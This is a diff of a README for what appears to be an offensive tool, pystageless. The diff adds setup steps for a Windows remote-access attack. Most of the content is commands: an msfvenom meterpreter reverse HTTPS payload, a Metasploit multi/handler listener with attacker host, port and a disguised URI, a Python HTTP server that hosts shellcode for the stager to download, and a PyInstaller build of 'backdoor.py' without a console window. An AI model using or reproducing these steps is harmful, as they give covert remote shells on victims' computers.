@@ -26,23 +26,43 @@ msfvenom -p windows/x64/meterpreter_reverse_https LHOST=10.69.27.216 LPORT=4455 
 ```
 ---
 
-### Host your shellcode
+### MSf
 
 ```bash
-python -m http.server 80
-
-# 2. Edit URL in script
-SHELLCODE_URL = "http://your-ip:80/shellcode.bin"
-
-# 3. Run
-python pystageless.py
+msf exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_https
+payload => windows/x64/meterpreter_reverse_https
+msf exploit(multi/handler) > set LHOST 10.69.27.216
+LHOST => 10.69.27.216
+msf exploit(multi/handler) > set LPORT 4455
+LPORT => 4455
+msf exploit(multi/handler) >  set luri /api/v1/data/
+luri => /api/v1/data/
+msf exploit(multi/handler) > run
 ```
 
 ---
 
-### Standalone exe Compilation
+### Host your shellcode
 
+```bash
+python -m http.server 80
 ```
+
+### Edit URL in script
+
+```bash
+SHELLCODE_URL = "http://your-ip:80/shellcode.bin"
+```
+
+### Run
+
+```bash
+python pystageless.py
+```
+
+### Standalone exe compilation.
+
+```bash
 python -m PyInstaller -F backdoor.py --noconsole
 ```
 
